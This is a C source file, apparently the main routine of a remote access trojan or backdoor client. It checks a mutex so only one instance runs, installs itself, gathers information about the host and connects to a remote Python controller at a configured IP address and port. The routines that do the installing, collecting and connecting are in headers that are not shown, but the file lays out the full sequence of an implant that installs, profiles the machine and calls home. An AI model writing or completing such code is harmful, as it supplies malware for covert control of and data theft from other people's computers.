#include <stdio.h>
#include <stdlib.h>
#include "Information.h"
#include "Install.h"
#include "Connection.h"
#include "Mutex.h"

int main()
{
    Sleep(2000);
    printf("# Starting server\n");
    printf("# Checking mutex... ");
    if(Mutex())
    {
        printf("already exists, now exit.");
        exit(0);
    }else
    {
        printf("not exists, continue.\n");
    }
    printf("# Installing server\n");
    InstallServer();
    printf("# Starting information gathering\n");
    GatherInformation();
    printf("# All ready, start connection\n");
    init_WSA();
    connectToPyServ(CONNECTION_IP, CONNECTION_PORT);
    return 0;
}
